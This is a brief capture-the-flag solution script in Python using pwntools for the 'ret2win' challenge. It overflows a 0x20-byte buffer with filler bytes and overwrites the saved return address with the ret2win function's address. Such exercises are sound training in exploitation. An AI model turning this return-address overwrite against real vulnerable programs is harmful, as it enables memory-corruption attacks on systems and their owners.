# ret2win

```python
import pwn
  
pwn.context(arch='amd64', os='linux', log_level='debug')

p = pwn.process('./ret2win')

e = pwn.ELF('./ret2win')

ret2win_addr = pwn.p64(e.sym['ret2win'])

payload = b'A' * 0x20 + b'B' * 8 + ret2win_addr

p.sendlineafter(b'> ', payload)

p.recv()
p.recv()
```